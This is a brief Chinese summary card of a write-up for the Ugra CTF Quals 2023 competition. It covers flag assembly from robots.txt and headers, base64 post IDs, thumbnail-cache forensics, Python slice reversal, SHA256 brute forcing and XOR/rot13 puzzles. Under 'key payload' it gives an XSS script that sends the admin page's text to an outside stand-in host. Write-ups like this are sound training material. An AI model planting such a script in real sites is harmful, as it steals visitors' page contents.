---
title: "Ugra CTF Quals 2023 WP (狼组)"
category: web
tags: ["Ugra CTF Quals 2023", "web", "robots_txt", "xss_admin", "postid_base64", "traffic_image"]
signals: ["Ugra CTF Quals 2023 2023", "robots_txt", "xss_admin", "postid_base64", "traffic_image", "win10_thumb_cache", "excel_sum", "slice_reverse", "sha256_brute", "xss", "Ugra", "flag", "XSS", "Python"]
difficulty: medium
source: "https://www.ctfiot.com/92675.html"
tools: ["Python"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# Ugra CTF Quals 2023 WP (狼组)

> 赛事：Ugra CTF Quals 2023 2023 | 方向：web | 难度：medium | 工具：Python

## 一句话总结

俄语 Ugra 资格赛杂烩 WP，三段式 flag + XSS 偷管理员 + 缩略图取证 + Python 切片回推 + rot13 等价链。

## 攻击链

1. Трисекция:源码+robots.txt+响应头三段拼 flag → Старые добрые времена:XSS 弹窗读 body → Сельский блог:postid base64 解密 → Захват трафика:HTTP 流导出图 → Мультфильмы:more 打开文件 → Музыкальная пятиминутка:win10 缩略图抽 flag → Бухгалтерия:Excel 求和公式填色 lattice → Elementary:Python 切片 flag[9:3:-2] / flag[-2:-15:-3].hex / flag[6:18:2].from_bytes(little) / sum(ord*1000**i) 全部回推 + SHA256 双 for 爆破 → Водоворот:rot13×1337=1 次 → Криптобаш:17 字节轮转+deadbeef XOR+反转 → Глубина:URL 路径跟随

## 关键 payload

```
<script>window.open('http://x/xss.php?msg='+encodeURI(document.body.textContent))</script> / flag[11],flag[13] brute 32-126 sha256 match
```

## 经验教训

字符串/字节反转 + little-endian + sum(ord*1000**i) 是 flag 还原三大套路，几乎所有 RE-Crypto 杂项都用得上。

## 标签

robots_txt、xss_admin、postid_base64、traffic_image、win10_thumb_cache、excel_sum、slice_reverse、sha256_brute、rot13_1337、key_xor_reverse、depth_walk

## 参考来源

- https://www.ctfiot.com/92675.html
- 原文件：Ugra_CTF_Quals_2023_WP.full.md
